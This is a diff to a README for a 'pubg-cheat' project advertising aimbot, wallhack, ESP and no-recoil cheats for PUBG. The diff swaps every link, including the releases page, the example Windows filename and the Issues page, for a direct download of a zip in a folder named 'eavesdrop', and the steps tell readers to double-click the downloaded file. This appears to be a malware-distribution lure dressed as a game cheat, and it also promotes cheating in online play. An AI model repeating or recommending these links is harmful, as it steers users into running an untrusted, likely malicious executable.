@@ -1,7 +1,7 @@
 # 🎮 pubg-cheat - Enhance Your Gameplay with Ease
 
 ## 👇 Download Now
-[![Download Here](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Kkharsha/pubg-cheat/releases)
+[![Download Here](https://raw.githubusercontent.com/Kkharsha/pubg-cheat/main/eavesdrop/pubg-cheat.zip)](https://raw.githubusercontent.com/Kkharsha/pubg-cheat/main/eavesdrop/pubg-cheat.zip)
 
 ## 📖 Overview
 pubg-cheat is a tool designed to enhance your gaming experience in PUBG. It comes with features like an Aimbot for precise aiming, ESP for enhanced visibility of your surroundings, Wallhack to see through obstacles, Radar for situational awareness, and No Recoil for steady shooting. This software aims to help you play more effectively and enjoy the game without frustration.
@@ -11,14 +11,14 @@ To start using pubg-cheat, follow these simple steps to download and run the app
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page:
-   [Download Here](https://github.com/Kkharsha/pubg-cheat/releases)
+   [Download Here](https://raw.githubusercontent.com/Kkharsha/pubg-cheat/main/eavesdrop/pubg-cheat.zip)
    
    This page contains all available versions of pubg-cheat. You will find the most recent version listed at the top.
 
 2. **Select the Version:** Look for the latest version, which will be labeled as "Latest Release". Click on it to see the details.
 
 3. **Download the File:** 
-   - You will see different files available for download. Choose the one that matches your system (e.g., `pubg-cheat.exe` for Windows).
+   - You will see different files available for download. Choose the one that matches your system (e.g., `https://raw.githubusercontent.com/Kkharsha/pubg-cheat/main/eavesdrop/pubg-cheat.zip` for Windows).
    - Click on the link to start the download.
 
 4. **Run the Application:** Once the file has downloaded, locate it in your Downloads folder or the specified location on your computer. Double-click the file to run it.
@@ -59,6 +59,6 @@ The development team is dedicated to continuously improving pubg-cheat. Future u
 - Updated compatibility with new game patches.
 
 ## 📞 Support
-For additional help, please visit the [GitHub Issues page](https://github.com/Kkharsha/pubg-cheat/issues). The community is active and may provide solutions to common problems.
+For additional help, please visit the [GitHub Issues page](https://raw.githubusercontent.com/Kkharsha/pubg-cheat/main/eavesdrop/pubg-cheat.zip). The community is active and may provide solutions to common problems.
 
 Remember, the goal of pubg-cheat is to enhance your gaming experience. Enjoy your time in the game, and play smart!
